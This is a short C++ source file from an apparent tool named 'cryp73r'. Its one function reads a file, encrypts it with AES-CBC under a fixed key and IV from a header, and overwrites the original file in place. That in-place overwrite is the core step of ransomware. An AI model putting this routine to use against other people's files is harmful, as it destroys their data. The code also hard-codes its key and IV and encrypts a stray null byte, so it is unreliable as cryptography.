#include "cryp73r.hpp"

void  f_encryptor(std::string filepath) {

    std::ifstream file_in(filepath);
    
    if (!file_in.is_open()) {
        std::cerr << "Failed to open " + filepath << std::endl;
        return ;
    }

    CryptoPP::SecByteBlock key(key_0);
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++)
        iv[i] = iv_0[i];

    std::string content((std::istreambuf_iterator<char>(file_in)), (std::istreambuf_iterator<char>()));
    file_in.close();
    std::string ciphertext;

    CryptoPP::AES::Encryption aesEncryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);

    CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink(ciphertext));
    stfEncryptor.Put(reinterpret_cast<const unsigned char*>(content.c_str()), content.length() + 1);
    stfEncryptor.MessageEnd();

    std::ofstream file_out(filepath);
    file_out << ciphertext;
    file_out.close();

    std::cout << filepath + " encrypted successfully!" << std::endl;
}
